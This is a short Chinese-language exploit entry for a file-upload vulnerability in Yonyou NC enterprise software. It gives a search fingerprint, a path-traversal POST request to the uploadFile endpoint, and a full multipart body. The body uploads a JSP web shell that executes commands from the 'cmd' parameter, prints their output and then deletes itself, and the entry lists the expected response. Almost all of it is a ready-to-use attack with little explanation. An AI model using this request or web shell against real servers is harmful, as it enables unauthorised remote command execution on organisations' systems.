# 用友NCuploadFile文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="1085941792"`
- **请求**：`POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYec…`

**请求体 / payload**
```
------WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: image/jpeg
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="submit"
上传
------WebKitFormBoundaryHHaZAYecVOf5sfa6--
上传位置
GET /mp/uploadFil…（脚本共 641 字，完整版见原文）
```
- **预期**：200　|　—